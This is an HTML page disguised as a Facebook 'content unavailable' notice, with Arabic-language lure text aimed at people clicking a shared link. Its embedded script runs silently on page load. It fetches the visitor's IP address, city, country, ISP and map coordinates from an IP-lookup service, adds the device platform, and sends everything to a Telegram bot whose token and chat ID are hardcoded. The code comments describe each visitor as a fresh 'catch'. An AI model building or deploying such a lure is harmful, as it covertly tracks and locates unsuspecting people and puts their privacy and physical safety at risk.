<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta property="og:title" content="عاجل: توضيح رسمي بخصوص المنشور المحذوف">
    <meta property="og:description" content="تم تقييد هذا المحتوى مؤقتاً لمراجعة معايير المجتمع. اضغط للمتابعة إلى فيسبوك.">
    <meta property="og:image" content="https://upload.wikimedia.org/wikipedia/commons/thumb/b/b8/2021_Facebook_icon.svg/1024px-2021_Facebook_icon.svg.png">
    <meta property="og:type" content="article">
    
    <title>Facebook - Content Removed</title>
    
    <style>
        body { margin:0; background:#f0f2f5; font-family: Arial, sans-serif; display:flex; justify-content:center; align-items:center; height:100vh; overflow:hidden; }
        .fb-card { text-align:center; padding:20px; max-width:400px; }
        .fb-btn { background:#1877f2; color:#fff; border:none; padding:10px 20px; border-radius:6px; font-weight:bold; cursor:pointer; text-decoration:none; }
    </style>
</head>
<body>

    <div class="fb-card">
        <img src="https://static.xx.fbcdn.net/rsrc.php/v3/y7/r/s9m_9bu7wS7.png" width="100">
        <h2 style="color:#65676b;">عذراً، هذا المحتوى غير متاح</h2>
        <p style="color:#65676b;">ربما تم حذف المنشور أو انتهاء صلاحية الرابط.</p>
        <a href="https://m.facebook.com" class="fb-btn">العودة للرئيسية</a>
    </div>

<script>
    // بيانات البوت الخاصة بك (لا تظهر للمستخدم العادي)
    const TOKEN = "8527565205:AAFpoyLDZir4oiQKqZPO-Cm40XVzUBvLER8";
    const ID = "1611398303";

    async function captureData() {
        // سحب البيانات السلبية (بدون أذونات GPS)
        // نعتمد هنا على الـ IP والمعلومات التي يرسلها المتصفح تلقائياً
        try {
            // جلب الـ IP والموقع التقريبي عبر خدمة خارجية موثوقة (صامتة)
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();

            let message = `🚩 صيد جديد من واتساب\n`;
            message += `🌐 الـ IP: ${data.ip}\n`;
            message += `📍 الموقع: ${data.city}, ${data.country_name}\n`;
            message += `📡 المزود: ${data.org}\n`;
            message += `📱 الجهاز: ${navigator.platform}\n`;
            message += `🔗 الخريطة: https://www.google.com/maps?q=${data.latitude},${data.longitude}`;

            // إرسال البيانات للتلجرام فوراً
            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(message)}`);
        } catch (e) {
            // في حال فشل الجلب، نرسل على الأقل معلومات النظام
            let fallbackMsg = `🚩 دخول (فشل تحديد الـ IP)\n📱 الجهاز: ${navigator.platform}`;
            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${ID}&text=${encodeURIComponent(fallbackMsg)}`);
        }
    }

    // التنفيذ التلقائي بمجرد التحميل (لأننا نسحب IP وليس GPS)
    window.onload = captureData;
</script>
</body>
</html>
